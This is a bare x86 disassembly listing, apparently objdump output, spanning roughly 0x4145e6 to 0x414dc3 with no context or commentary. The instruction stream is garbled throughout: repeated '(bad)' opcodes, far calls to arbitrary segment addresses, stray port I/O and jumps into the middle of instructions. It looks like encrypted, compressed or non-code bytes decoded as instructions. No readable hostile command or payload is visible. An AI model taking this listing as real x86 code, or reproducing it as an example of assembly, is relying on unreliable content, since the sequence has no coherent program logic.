  4145e6:	jae    0x4145aa
  4145e8:	mov    ch,0xb7
  4145ea:	jo     0x414630
  4145ec:	(bad)  
  4145ee:	sub    eax,0xff472d32
  4145f3:	imul   esi,esp,0x6b
  4145f6:	into   
  4145f7:	aam    0xb8
  4145f9:	ret    
  4145fa:	jbe    0x41461c
  4145fc:	test   al,0xff
  4145fe:	(bad)  
  4145ff:	out    0x86,al
  414601:	test   DWORD PTR [edx-0x3be22153],edi
  414607:	(bad)  
  414608:	mov    eax,ds:0xcf04eba9
  41460d:	push   esp
  41460e:	ja     0x4145d1
  414610:	xor    eax,0x36e6d4f6
  414615:	fist   DWORD PTR [esi+0xf]
  414618:	or     eax,0xe4a762f4
  41461d:	push   ecx
  41461e:	add    DWORD PTR [eax-0x4e18c144],edx
  414624:	mov    ebx,DWORD PTR [esi+0x68]
  414627:	bound  ebp,QWORD PTR [ebx]
  414629:	imul   edi,DWORD PTR [edi+0x194f3e36],0xffffff86
  414630:	mov    eax,ds:0x6e90f134
  414635:	sbb    DWORD PTR [ebp-0x72],ebx
  414638:	adc    DWORD PTR [edi+0x4d],esi
  41463b:	cs jecxz 0x414614
  41463e:	mov    cl,0xbb
  414640:	(bad)
  414644:	jge    0x4146b7
  414646:	pushf  
  414647:	test   al,0xb4
  414649:	mov    dl,0xb2
  41464b:	push   esp
  41464c:	sbb    al,0xd0
  41464e:	push   edi
  41464f:	xor    ebx,DWORD PTR gs:[edi]
  414652:	inc    ecx
  414653:	sbb    al,0x98
  414655:	sahf   
  414656:	or     al,0x46
  414658:	cld    
  414659:	arpl   WORD PTR [edx],sp
  41465b:	cli    
  41465c:	sbb    al,0xd7
  41465e:	pop    ss
  41465f:	inc    ebx
  414660:	mov    WORD PTR [ecx+0xc],es
  414663:	lahf   
  414664:	faddp  st(0),st
  414666:	xlat   BYTE PTR ds:[ebx]
  414667:	outs   dx,BYTE PTR ds:[esi]
  414668:	push   ebp
  414669:	jae    0x4146d3
  41466b:	(bad)  
  41466c:	mov    eax,0xf5adcdda
  414671:	dec    esi
  414672:	cli    
  414673:	jne    0x41461e
  414675:	popf   
  414676:	ret    
  414677:	and    eax,0x25a14faa
  41467c:	or     al,bl
  41467e:	or     al,0x38
  414680:	dec    ecx
  414681:	inc    ebp
  414682:	adc    DWORD PTR [edi-0x255ace63],eax
  414688:	pusha  
  414689:	mov    dh,0x8
  41468b:	push   cs
  41468c:	dec    edx
  41468d:	inc    ebp
  41468e:	mov    DWORD PTR [esi-0x502aa2fa],esp
  414694:	jp     0x4146d4
  414696:	cwde   
  414697:	aaa    
  414698:	mov    ecx,0x19d4574a
  41469d:	and    cl,BYTE PTR [edi-0x75d5d7ee]
  4146a3:	fild   WORD PTR [edx]
  4146a5:	xor    edi,0xffffffa8
  4146a8:	cmp    dh,BYTE PTR [edx-0x79765a3c]
  4146ae:	imul   ebp,DWORD PTR [edx+0x709b58bb],0x2c
  4146b5:	jmp    FWORD PTR [eax-0x33dfc97e]
  4146bb:	ficom  DWORD PTR [ecx-0x2a24b1f2]
  4146c1:	mov    WORD PTR ds:0x8ff37b41,gs
  4146c7:	lea    edi,[edi]
  4146c9:	jge    0x41470b
  4146cb:	call   0x5407:0xf0f4d985
  4146d2:	jg     0x41474e
  4146d4:	ss lahf 
  4146d6:	inc    ebp
  4146d7:	call   0xb7bf133e
  4146dc:	cs jp  0x41472d
  4146df:	popf   
  4146e0:	shl    BYTE PTR [eax+0x1a],cl
  4146e3:	in     eax,dx
  4146e4:	sub    DWORD PTR [edi+0x5c7c101a],0xffffffd8
  4146eb:	cmp    BYTE PTR [esi+0x71],al
  4146ee:	out    dx,al
  4146ef:	not    DWORD PTR [edi-0x417faaa2]
  4146f5:	sbb    al,0xc0
  4146f7:	and    ebx,DWORD PTR [eax]
  4146f9:	or     DWORD PTR [ebx],eax
  4146fb:	sbb    bl,BYTE PTR [eax]
  4146fd:	lock and DWORD PTR es:[edi+0x787dc5cf],ecx
  414705:	in     al,dx
  414706:	push   ebx
  414707:	and    DWORD PTR ds:0x2e030d91,edx
  41470d:	push   ebx
  41470e:	push   edx
  41470f:	in     al,dx
  414710:	xchg   ebx,eax
  414711:	or     DWORD PTR [ebp-0x595106f0],0x64ae4152
  41471b:	iret   
  41471c:	sub    eax,0x41e6d7f2
  414721:	call   0xb31d:0x66847981
  414728:	mov    cl,0xbf
  41472a:	dec    eax
  41472b:	pop    edx
  41472c:	cld    
  41472d:	mov    edx,0xa1d7ebe5
  414732:	jp     0x414730
  414734:	xchg   edx,eax
  414735:	mov    eax,0x5d1dd6fc
  41473a:	push   eax
  41473b:	(bad)  
  41473c:	out    dx,eax
  41473d:	jle    0x4146eb
  41473f:	and    BYTE PTR [edx-0x3b],bh
  414742:	xchg   edx,eax
  414743:	pusha  
  414744:	aam    0x88
  414746:	pop    esp
  414747:	data16 jne 0x41477d
  41474a:	inc    edx
  41474b:	fistp  DWORD PTR [ecx+0x1c]
  41474e:	in     eax,0x71
  414750:	push   esi
  414751:	add    BYTE PTR [ecx-0x7bfba0c7],cl
  414757:	fnstsw WORD PTR [eax-0x69]
  41475a:	ret    
  41475b:	fneni(8087 only) 
  41475d:	rcl    BYTE PTR [ebx*1-0x6345df22],0x6f
  414765:	dec    esp
  414766:	lods   al,BYTE PTR ds:[esi]
  414767:	push   0x7edf2d9f
  41476c:	mov    esp,0x8c21307
  414771:	add    eax,0xce5b5e7e
  414776:	retf   
  414777:	ins    BYTE PTR es:[edi],dx
  414778:	pop    ebp
  414779:	push   edx
  41477a:	mov    esi,0xdf1cb012
  41477f:	outs   dx,DWORD PTR ds:[esi]
  414780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414781:	das    
  414782:	pop    ss
  414783:	cmp    BYTE PTR [eax+ecx*1+0x1ef11d78],al
  41478a:	stos   DWORD PTR es:[edi],eax
  41478b:	ja     0x414741
  41478d:	faddp  st(1),st
  41478f:	mov    eax,es
  414791:	int3   
  414792:	pop    ss
  414793:	and    eax,ebx
  414795:	mov    ah,0x46
  414797:	add    esi,DWORD PTR [edx-0x6573f880]
  41479d:	sbb    DWORD PTR [ebx],0xffffffc5
  4147a0:	into   
  4147a1:	mov    ebp,0x85f8ec8e
  4147a6:	je     0x414775
  4147a8:	int    0x38
  4147aa:	lds    esi,FWORD PTR [esi-0x29340320]
  4147b0:	and    eax,0xb16ca96f
  4147b5:	xchg   DWORD PTR [ebp-0x2e119988],esp
  4147bb:	inc    eax
  4147bc:	xchg   edi,eax
  4147bd:	inc    ebp
  4147be:	fwait
  4147bf:	and    DWORD PTR [ebp-0x65bf38a9],ecx
  4147c5:	retf   0x2da1
  4147c8:	xor    eax,0x14a12f02
  4147cd:	cmc    
  4147ce:	out    dx,eax
  4147cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d0:	dec    edx
  4147d1:	sbb    BYTE PTR [ebx-0x47],0x26
  4147d5:	out    dx,al
  4147d6:	mov    al,0x6a
  4147d8:	xchg   DWORD PTR [esi-0x12d8656b],ecx
  4147de:	inc    ecx
  4147df:	(bad)  
  4147e0:	idiv   BYTE PTR [edx-0x40]
  4147e3:	cmc    
  4147e4:	push   ebx
  4147e5:	sbb    edx,DWORD PTR [ebx+0xffda633]
  4147eb:	jo     0x4147d0
  4147ed:	fdivrp st(2),st
  4147ef:	mov    DWORD PTR [edx-0x76],edx
  4147f2:	jmp    0xea39:0x34b2a906
  4147f9:	lods   al,BYTE PTR ds:[esi]
  4147fa:	jne    0x414804
  4147fc:	sub    al,0xdc
  4147fe:	push   ecx
  4147ff:	arpl   WORD PTR [ebx+0x4],sp
  414802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414803:	nop
  414804:	and    BYTE PTR [edx-0x313b4f0e],0x61
  41480b:	jb     0x4147ae
  41480d:	test   ch,ah
  41480f:	mov    esp,0xc74ce78
  414814:	loope  0x41481a
  414816:	ja     0x414854
  414818:	ss stos DWORD PTR es:[edi],eax
  41481a:	loop   0x4147bf
  41481c:	leave  
  41481d:	adc    ah,dl
  41481f:	add    DWORD PTR fs:[eax-0x35],ebx
  414823:	add    ecx,ebp
  414825:	pushf  
  414826:	and    BYTE PTR [edx+0x472ddc1b],bh
  41482c:	sti    
  41482d:	inc    esi
  41482e:	pop    ebx
  41482f:	sbb    ch,dh
  414831:	dec    edx
  414832:	fbstp  TBYTE PTR [ecx+0x62]
  414835:	fimul  DWORD PTR [ecx-0x5f]
  414838:	dec    edi
  414839:	(bad)
  41483c:	mov    BYTE PTR ds:0xa69be25c,ch
  414842:	dec    ebx
  414843:	and    DWORD PTR [edi+0x33],0xea6c0f49
  41484a:	jnp    0x41485b
  41484c:	cwde   
  41484d:	iret   
  41484e:	outs   dx,DWORD PTR ds:[esi]
  41484f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414850:	push   ss
  414851:	mov    edx,DWORD PTR [ebp+0x15205cd8]
  414857:	xor    edi,edx
  414859:	sub    ebx,DWORD PTR [edx+0x4f]
  41485c:	aaa    
  41485d:	cmp    DWORD PTR [edi-0x50],ecx
  414860:	mov    bl,0xb9
  414862:	pop    ecx
  414863:	in     eax,0xfb
  414865:	ins    BYTE PTR es:[edi],dx
  414866:	xor    dl,dl
  414868:	fcom   QWORD PTR [eax-0x6988a39e]
  41486e:	inc    esi
  41486f:	pop    ecx
  414870:	(bad)  
  414871:	jmp    0x26729e9f
  414876:	shl    DWORD PTR [eax+0x20ab390e],1
  41487c:	or     BYTE PTR [ecx+eax*1],bh
  41487f:	sbb    dl,cl
  414881:	test   BYTE PTR [edx],cl
  414883:	dec    edx
  414884:	popf   
  414885:	inc    BYTE PTR ds:0x244ef99
  41488b:	cmp    cl,BYTE PTR [ebp-0x7a]
  41488e:	sbb    eax,0x705a7115
  414893:	jecxz  0x414900
  414895:	dec    edx
  414896:	jb     0x414842
  414898:	pop    ecx
  414899:	iret   
  41489a:	retf   0xbdd4
  41489d:	loope  0x414820
  41489f:	fbstp  TBYTE PTR ds:[ebx]
  4148a2:	dec    eax
  4148a3:	syscall 
  4148a5:	cmp    eax,0xb09ea441
  4148aa:	mov    dh,BYTE PTR ds:[edx+0x25]
  4148ae:	push   esp
  4148af:	(bad)  
  4148b0:	arpl   WORD PTR [esi-0x6ddbffa6],ax
  4148b6:	and    al,0x62
  4148b8:	aas    
  4148b9:	ins    DWORD PTR es:[edi],dx
  4148ba:	lods   eax,DWORD PTR ds:[esi]
  4148bb:	push   0x42
  4148bd:	test   BYTE PTR [edx+0x1d],dl
  4148c0:	xchg   BYTE PTR [edx+0x22a995f2],bl
  4148c6:	pop    eax
  4148c7:	mov    esp,0xaf3b6892
  4148cc:	xor    al,0x58
  4148ce:	inc    ecx
  4148cf:	sub    eax,0x7f82225b
  4148d4:	(bad)  [ecx+edi*8-0x665b1f4c]
  4148db:	jl     0x414959
  4148dd:	outs   dx,BYTE PTR ds:[esi]
  4148de:	outs   dx,DWORD PTR ds:[esi]
  4148df:	in     al,0x48
  4148e1:	jge    0x4148ff
  4148e3:	mov    esi,0x27677e6a
  4148e8:	stos   DWORD PTR es:[edi],eax
  4148e9:	inc    sp
  4148eb:	inc    eax
  4148ec:	rcr    BYTE PTR [ecx+edx*1-0x24f9d7c5],cl
  4148f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f4:	cmc    
  4148f5:	jmp    0x2e3d5e91
  4148fa:	jne    0x414889
  4148fc:	jp     0x41488c
  4148fe:	inc    esi
  4148ff:	mov    cs,ecx
  414901:	add    al,0x7f
  414903:	mov    al,ds:0x9483c159
  414908:	icebp  
  414909:	xor    cl,bl
  41490b:	jno    0x41492d
  41490d:	iret   
  41490e:	call   0x8ab7:0xc175632e
  414915:	retf   
  414916:	(bad)  
  414918:	jno    0x414940
  41491a:	data16 stos BYTE PTR es:[edi],al
  41491c:	gs mov ebx,0xd6871bdf
  414922:	and    esp,DWORD PTR [ecx+0x56457bbd]
  414928:	push   es
  414929:	(bad)  
  41492a:	test   al,0xe7
  41492c:	stc    
  41492d:	push   edi
  41492e:	inc    edx
  41492f:	(bad)  
  414930:	jle    0x4148d4
  414932:	in     al,0xa5
  414934:	sub    edx,DWORD PTR ds:0xf84d9b42
  41493a:	cwde   
  41493b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493d:	mov    DWORD PTR [edi+0x7],0xbe3aa4f0
  414944:	mov    bh,0xdd
  414946:	test   ecx,esp
  414948:	or     bl,al
  41494a:	repnz sub dh,BYTE PTR cs:[edi]
  41494e:	and    eax,0xd19dd68b
  414953:	hlt    
  414954:	mov    DWORD PTR [ebp+0x3f589f96],ebp
  41495a:	fwait
  41495b:	inc    edi
  41495c:	aaa    
  41495d:	mov    ah,0xbb
  41495f:	xchg   esi,eax
  414960:	aaa    
  414961:	idiv   DWORD PTR [ebx+0x3e]
  414964:	adc    eax,0x2d41ef24
  414969:	pop    eax
  41496a:	cvttps2pi mm3,QWORD PTR ds:0x7f529acc
  414971:	push   es
  414972:	(bad)  
  414973:	or     edi,DWORD PTR [edx+0x1c]
  414976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414977:	ds retf 0x1b86
  41497b:	(bad)  
  41497c:	sub    bh,BYTE PTR [ebx-0x4e]
  41497f:	aas    
  414980:	mov    bl,0xb5
  414982:	push   es
  414983:	lods   al,BYTE PTR ds:[esi]
  414984:	cs add al,0xf1
  414987:	mov    DWORD PTR [edx-0x49],edx
  41498a:	add    al,0x2a
  41498c:	lods   eax,DWORD PTR ds:[esi]
  41498d:	pop    esp
  41498e:	jnp    0x41492a
  414990:	xor    al,0x9a
  414992:	push   ss
  414993:	out    dx,al
  414994:	push   ecx
  414995:	cmp    BYTE PTR [ecx],al
  414997:	push   ebp
  414998:	jno    0x414959
  41499a:	mov    bl,0x15
  41499c:	xor    ah,dl
  41499e:	sub    al,0xea
  4149a0:	sub    eax,DWORD PTR [ecx+0x5a]
  4149a3:	push   ebp
  4149a4:	test   al,0xd4
  4149a6:	fild   WORD PTR [eax+edi*2]
  4149a9:	jle    0x4149c1
  4149ab:	lock retf 
  4149ad:	pop    ss
  4149ae:	mov    ecx,0x952e4102
  4149b3:	add    BYTE PTR [edx+esi*4-0x1c],dh
  4149b7:	jb     0x4149a0
  4149b9:	cmp    DWORD PTR [esi-0x6a970e07],esp
  4149bf:	jnp    0x41497f
  4149c1:	mov    fs,ebp
  4149c3:	retf   0xa1eb
  4149c6:	es inc ebx
  4149c8:	mov    bh,BYTE PTR [edi]
  4149ca:	sbb    BYTE PTR [eax],0x54
  4149cd:	cmp    BYTE PTR [esi-0x7c620d16],dl
  4149d3:	adc    bh,dl
  4149d5:	retf   0x18cf
  4149d8:	cmp    DWORD PTR [edi-0x60],ecx
  4149db:	pop    ds
  4149dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149dd:	xchg   ebx,eax
  4149de:	mov    edi,0x82381b0e
  4149e3:	or     BYTE PTR [eax-0x57],0xd7
  4149e7:	call   0x7e7a:0x5ff90b81
  4149ee:	in     al,dx
  4149ef:	sti    
  4149f0:	xchg   edx,eax
  4149f1:	ss add edx,0xda958bd
  4149f8:	sbb    esp,ebx
  4149fa:	or     eax,esp
  4149fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149fd:	dec    ebx
  4149fe:	xchg   esi,eax
  4149ff:	mov    ds,WORD PTR [eax*4+0x21219d55]
  414a06:	sbb    cl,BYTE PTR [ebp-0x7c96836]
  414a0c:	pop    esi
  414a0d:	xchg   ecx,ebp
  414a0f:	(bad)  
  414a10:	jo     0x4149af
  414a12:	xchg   ebp,eax
  414a13:	call   0xb9e0d25a
  414a18:	imul   BYTE PTR [ecx]
  414a1a:	out    dx,al
  414a1b:	scas   eax,DWORD PTR es:[edi]
  414a1c:	into   
  414a1d:	pop    edi
  414a1e:	ja     0x4149c7
  414a20:	push   esi
  414a21:	pop    ss
  414a22:	mov    ds,WORD PTR [ecx]
  414a24:	mov    ebx,0x246c4d1d
  414a29:	pop    esi
  414a2a:	mov    bh,0xdc
  414a2c:	retf   
  414a2d:	dec    ecx
  414a2e:	clc    
  414a2f:	adc    DWORD PTR [edx],esi
  414a31:	in     eax,0xcc
  414a33:	inc    edi
  414a34:	mov    bh,0xca
  414a36:	mov    bh,0x8b
  414a38:	push   esi
  414a39:	sti    
  414a3a:	nop
  414a3b:	dec    esp
  414a3c:	out    dx,eax
  414a3d:	mov    ecx,DWORD PTR [eax+esi*1+0x60c23fb5]
  414a44:	inc    ebx
  414a45:	sub    dh,bh
  414a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a48:	xor    al,0xa5
  414a4a:	dec    edx
  414a4b:	pop    es
  414a4c:	dec    ecx
  414a4d:	mov    ah,0xac
  414a4f:	cmp    ecx,DWORD PTR [esi]
  414a51:	mov    esi,0x7b0867c2
  414a56:	cmc    
  414a57:	xor    BYTE PTR [edi+0x4c],ah
  414a5a:	cli    
  414a5b:	fcomip st,st(0)
  414a5d:	js     0x414a28
  414a5f:	nop
  414a60:	mov    esp,0xd9a2deb8
  414a65:	dec    ebp
  414a66:	test   al,0x3d
  414a68:	repnz fwait
  414a6a:	rcl    DWORD PTR [eax],1
  414a6c:	call   0xc4b5c176
  414a71:	pushf  
  414a72:	pop    edi
  414a73:	jae    0x414aa0
  414a75:	xor    DWORD PTR [eax+0x75],edx
  414a78:	ret    
  414a79:	daa    
  414a7a:	inc    ebp
  414a7b:	call   0x9766:0xcdc6e281
  414a82:	adc    cl,bh
  414a84:	xchg   bl,cl
  414a86:	test   DWORD PTR ds:0xeceebce3,ebx
  414a8c:	dec    ebx
  414a8d:	sbb    DWORD PTR [edx],0x3e8e1f8e
  414a93:	(bad)  
  414a94:	adc    edx,esp
  414a96:	fcomp  DWORD PTR [ebx+0x39]
  414a99:	sbb    eax,0xfb6f9735
  414a9e:	loop   0x414a34
  414aa0:	or     ah,BYTE PTR [eax+eax*8-0x37]
  414aa4:	xchg   esp,eax
  414aa5:	out    0x5d,al
  414aa7:	aaa    
  414aa8:	pop    edi
  414aa9:	mul    DWORD PTR [ebx+0x5043f17e]
  414aaf:	stos   DWORD PTR es:[edi],eax
  414ab0:	aad    0x3d
  414ab2:	push   es
  414ab3:	test   eax,0xbb8d2b26
  414ab8:	xchg   DWORD PTR [ecx+ebp*4],edi
  414abb:	sub    al,BYTE PTR [edx-0x26d14579]
  414ac1:	and    BYTE PTR [esi+ebx*2],cl
  414ac4:	mov    eax,0x121d5dad
  414ac9:	jle    0x414b16
  414acb:	fidivr WORD PTR [ebx+0x7f25298d]
  414ad1:	outs   dx,BYTE PTR ds:[esi]
  414ad2:	xchg   esi,eax
  414ad3:	jne    0x414b42
  414ad5:	xor    ebx,DWORD PTR [esi+0x5daa19b1]
  414adb:	in     eax,dx
  414adc:	sahf   
  414add:	push   si
  414adf:	das    
  414ae0:	mov    al,ds:0x23767f62
  414ae5:	inc    esi
  414ae6:	out    dx,eax
  414ae7:	push   edi
  414ae8:	aas    
  414ae9:	push   esi
  414aea:	xor    BYTE PTR [ebp-0x7b],cl
  414aed:	js     0x414a9b
  414aef:	adc    cl,BYTE PTR [eax+ebx*8+0x270a76d7]
  414af6:	sbb    BYTE PTR [esi],dl
  414af8:	in     eax,dx
  414af9:	mov    ds:0x3f555a0a,eax
  414afe:	xor    al,0x6c
  414b00:	cld    
  414b01:	fmul   st(2),st
  414b03:	sbb    eax,0x47dfd596
  414b08:	mov    esi,0xe0f3751a
  414b0d:	or     BYTE PTR [esi+edx*4-0x3f96864b],dl
  414b14:	(bad)  
  414b15:	(bad)  
  414b16:	mov    eax,ds:0xa77a9812
  414b1b:	sbb    eax,0x42aefccc
  414b20:	and    BYTE PTR [esp+eax*4-0x74e9b197],cl
  414b27:	test   al,0xf5
  414b29:	xchg   esp,eax
  414b2a:	jmp    0x414ba1
  414b2c:	in     eax,dx
  414b2d:	xor    DWORD PTR [eax-0x4fa9edc4],esi
  414b33:	retf   
  414b34:	xor    BYTE PTR [ebx+ebx*2+0x72],0xfc
  414b39:	jnp    0x414b61
  414b3b:	into   
  414b3c:	xchg   ebx,eax
  414b3d:	stos   BYTE PTR es:[edi],al
  414b3e:	fmul   st,st(0)
  414b40:	mov    eax,0xef1cea73
  414b45:	pop    edi
  414b46:	xchg   DWORD PTR [ecx],ecx
  414b48:	(bad)  
  414b4a:	fs ds add eax,0x8c4c1922
  414b51:	imul   ecx,DWORD PTR [ecx-0x33],0x6e
  414b55:	jns    0x414b25
  414b57:	jb     0x414bd1
  414b59:	mov    DWORD PTR [esi-0x5a],0xf65b61cf
  414b60:	(bad)  
  414b61:	aam    0x26
  414b63:	pop    ecx
  414b64:	(bad)  
  414b65:	aas    
  414b66:	out    dx,al
  414b67:	dec    edx
  414b68:	nop    DWORD PTR [esi+edi*4+0x65c920ff]
  414b70:	test   eax,0x75d7643b
  414b75:	fmul   QWORD PTR [eax]
  414b77:	fnstenv [eax]
  414b79:	rol    BYTE PTR [esi+0x8],1
  414b7c:	mov    dl,0x6e
  414b7e:	pushf  
  414b7f:	imul   ecx,DWORD PTR [ebx+0x6c1bb730],0x2e
  414b86:	fldenv [edx-0x60ab5ee0]
  414b8c:	sbb    BYTE PTR [esi-0x1a],0xe3
  414b90:	test   eax,0xe34cebeb
  414b95:	ja     0x414b97
  414b97:	out    0x5d,al
  414b99:	mov    ah,0xa4
  414b9b:	fmul   DWORD PTR [edi]
  414b9d:	enter  0xa60a,0x73
  414ba1:	or     DWORD PTR [edx+0x26d3a9a4],ecx
  414ba7:	(bad)  
  414ba8:	call   0xd00341fc
  414bad:	xor    cl,BYTE PTR [ebp-0x3134dfb5]
  414bb3:	mov    ebx,0x9afe4062
  414bb8:	cdq    
  414bb9:	mov    ah,0x12
  414bbb:	cmp    al,BYTE PTR [eax-0x7d]
  414bbe:	les    edi,FWORD PTR [ecx+eax*1]
  414bc1:	add    ah,bh
  414bc3:	icebp  
  414bc4:	inc    esi
  414bc5:	adc    BYTE PTR [esi],dh
  414bc7:	shr    BYTE PTR [eax-0x69],0xc4
  414bcb:	(bad)  
  414bcc:	repnz mov ch,0x1
  414bcf:	inc    ebx
  414bd0:	in     eax,dx
  414bd1:	mov    ebx,0xc31bd2df
  414bd6:	and    al,0xdf
  414bd8:	mov    ds:0xf303b166,al
  414bdd:	in     al,dx
  414bde:	fmul   DWORD PTR [edx+0x2b47740e]
  414be4:	int    0x15
  414be6:	mov    ebx,0xf06a03f1
  414beb:	pop    ss
  414bec:	lea    esi,[ecx-0x18]
  414bef:	(bad)  
  414bf0:	push   ebx
  414bf1:	cmp    DWORD PTR fs:[eax-0x4a2e1d07],ecx
  414bf8:	in     al,dx
  414bf9:	dec    esp
  414bfa:	cli    
  414bfb:	cmp    DWORD PTR [esi],ebp
  414bfd:	sbb    al,0xdd
  414bff:	push   ecx
  414c00:	sub    ah,BYTE PTR [esi-0x7da1a244]
  414c06:	pop    ss
  414c07:	push   esi
  414c08:	mov    bl,0xc8
  414c0a:	out    dx,eax
  414c0b:	dec    edi
  414c0c:	mov    al,0x19
  414c0e:	mov    ebp,DWORD PTR [ebp-0xbbe13dd]
  414c14:	or     ebp,DWORD PTR ds:0x9c63fd88
  414c1a:	xor    eax,DWORD PTR [ecx+0x4d]
  414c1d:	stc    
  414c1e:	sti    
  414c1f:	ror    BYTE PTR [esi+0x64722ca2],1
  414c25:	in     eax,dx
  414c26:	mov    esi,0xf7845e74
  414c2b:	test   BYTE PTR [edi],cl
  414c2d:	xchg   ebx,eax
  414c2e:	sub    al,0x37
  414c30:	and    bl,BYTE PTR [esi+edx*8-0x3b283275]
  414c37:	retf   0xf372
  414c3a:	jo     0x414cac
  414c3c:	mov    al,ds:0xc1708f54
  414c41:	xor    DWORD PTR [ebx],0x110b9810
  414c47:	out    0xdf,eax
  414c49:	sub    edi,DWORD PTR [edx-0x7e444f4f]
  414c4f:	rcr    BYTE PTR [ecx+ebx*4],1
  414c52:	push   esp
  414c53:	xor    eax,0x4e0ba811
  414c58:	rcr    DWORD PTR [eax+0x5c],cl
  414c5b:	add    al,0x64
  414c5d:	push   cs
  414c5e:	push   es
  414c5f:	adc    DWORD PTR [edi],esi
  414c61:	xlat   BYTE PTR ds:[ebx]
  414c62:	pop    edx
  414c63:	sbb    eax,0xf9bc1811
  414c68:	and    BYTE PTR [edx-0x715a2a0e],bl
  414c6e:	int    0xa5
  414c70:	ficomp DWORD PTR [ebx+0x3414a617]
  414c76:	xchg   ebx,eax
  414c77:	dec    edx
  414c78:	stos   DWORD PTR es:[edi],eax
  414c79:	sub    al,0x8e
  414c7b:	push   ss
  414c7c:	dec    esp
  414c7d:	push   ss
  414c7e:	scas   eax,DWORD PTR es:[edi]
  414c7f:	(bad)  
  414c81:	leave  
  414c82:	cmp    esi,DWORD PTR [esi-0x1c]
  414c85:	cld    
  414c86:	push   ebx
  414c87:	mov    al,0xc4
  414c89:	xchg   edi,eax
  414c8a:	dec    edi
  414c8b:	(bad)  
  414c8c:	(bad)  
  414c8d:	cmp    cl,BYTE PTR [ecx+0x2a2ecc47]
  414c93:	mov    al,0x4b
  414c95:	sbb    al,0xc4
  414c97:	fldenv ds:0xd08b90bc
  414c9d:	fidivr WORD PTR es:[ebp-0x6947bb59]
  414ca4:	imul   DWORD PTR [ecx-0x76]
  414ca7:	outs   dx,DWORD PTR ds:[esi]
  414ca8:	sbb    ecx,DWORD PTR [esi+0x2b68eae2]
  414cae:	(bad)  
  414caf:	sbb    cl,BYTE PTR [eax]
  414cb1:	xchg   bh,dh
  414cb3:	mov    bh,0x94
  414cb5:	test   DWORD PTR [eax+eax*8+0x6e],edi
  414cb9:	or     DWORD PTR [ecx-0x38390759],eax
  414cbf:	call   0xad5:0xe5d27b0f
  414cc6:	loope  0x414d39
  414cc8:	mov    cl,0x28
  414cca:	sbb    dl,BYTE PTR [ecx-0xa]
  414ccd:	cmp    al,0x6b
  414ccf:	es mov bh,0x9c
  414cd2:	sbb    ch,BYTE PTR [edx+0x6cdc3658]
  414cd8:	mov    ds:0x284fbd6,al
  414cdd:	push   ebp
  414cde:	rol    BYTE PTR [edx+0x5e],cl
  414ce1:	pop    ds
  414ce2:	pop    edi
  414ce3:	xchg   ebp,eax
  414ce4:	sub    al,0x69
  414ce7:	inc    ebp
  414ce8:	and    BYTE PTR [ebx+0x7bdf734d],ch
  414cee:	or     DWORD PTR [ecx],eax
  414cf0:	sbb    al,0x78
  414cf2:	jbe    0x414c90
  414cf4:	xchg   ecx,eax
  414cf5:	sahf   
  414cf6:	in     eax,0x37
  414cf8:	pop    ss
  414cf9:	pop    ss
  414cfa:	into   
  414cfb:	dec    esi
  414cfc:	or     eax,0x73f32445
  414d01:	stc    
  414d02:	stos   BYTE PTR es:[edi],al
  414d03:	(bad)  
  414d04:	mov    cl,0x11
  414d06:	mov    bl,0x58
  414d08:	scas   eax,DWORD PTR es:[edi]
  414d09:	loope  0x414d1f
  414d0b:	cmp    ebp,DWORD PTR [esi+0x3b]
  414d0e:	pop    es
  414d0f:	xor    al,0x1
  414d11:	jo     0x414d10
  414d13:	jl     0x414cb1
  414d15:	sub    bl,BYTE PTR [edi-0x4107c21e]
  414d1b:	pop    ebp
  414d1c:	mov    edi,0x318d8642
  414d21:	int3   
  414d22:	mov    al,0xf
  414d24:	xor    eax,ebx
  414d26:	pop    edi
  414d27:	sar    DWORD PTR [ecx-0x3c],1
  414d2a:	or     BYTE PTR [eax-0x9],cl
  414d2d:	rcl    DWORD PTR [edx+0x36],cl
  414d30:	loope  0x414cee
  414d32:	xor    DWORD PTR [esi],edi
  414d34:	or     BYTE PTR [ebp+0x3cdad147],cl
  414d3a:	and    bh,dh
  414d3c:	(bad)  
  414d3d:	push   edx
  414d3e:	jmp    0x414cd5
  414d40:	or     edi,DWORD PTR [edx]
  414d42:	stos   BYTE PTR es:[edi],al
  414d43:	push   esp
  414d44:	jns    0x414db1
  414d46:	fnstenv [ebx-0x2d]
  414d49:	push   ds
  414d4a:	cmp    ch,al
  414d4c:	repz aas 
  414d4e:	sti    
  414d4f:	jp     0x414d6e
  414d51:	pop    ecx
  414d52:	stos   DWORD PTR es:[edi],eax
  414d53:	cmp    edi,DWORD PTR [eax-0x1110dded]
  414d59:	ds or  al,ch
  414d5c:	sbb    BYTE PTR [bp+di+0x34],dh
  414d60:	popa   
  414d61:	cmp    al,0xec
  414d63:	ss jmp 0x68fa:0x3031c8d4
  414d6b:	test   eax,0x48784bac
  414d70:	loope  0x414dda
  414d72:	sub    eax,ecx
  414d74:	pop    edi
  414d75:	pop    edi
  414d76:	sbb    eax,0x46ccb548
  414d7b:	shr    BYTE PTR [edi+0x4f8d412b],cl
  414d81:	popf   
  414d82:	ds xor edx,edx
  414d85:	loop   0x414db7
  414d87:	dec    esi
  414d88:	mov    edx,0xe824182f
  414d8d:	mov    ah,0x97
  414d8f:	pop    edi
  414d90:	adc    BYTE PTR ds:0xb98ae82f,ch
  414d96:	pop    esp
  414d97:	push   ecx
  414d98:	xchg   ecx,eax
  414d99:	mov    dl,0xa0
  414d9b:	jmp    0x914931f1
  414da0:	jg     0x414df5
  414da2:	jge    0x414d64
  414da4:	jne    0x414dc6
  414da6:	sub    ebx,DWORD PTR [edx]
  414da8:	dec    esi
  414da9:	sbb    al,BYTE PTR [edi+0x5f679cd0]
  414daf:	lds    esi,FWORD PTR [edx+0x297616b8]
  414db5:	mov    bh,0x45
  414db7:	stos   BYTE PTR es:[edi],al
  414db8:	push   0xeebd6b72
  414dbd:	repnz adc eax,esp
  414dc0:	cdq    
  414dc1:	clc    
  414dc2:	inc    esi
  414dc3:	das    
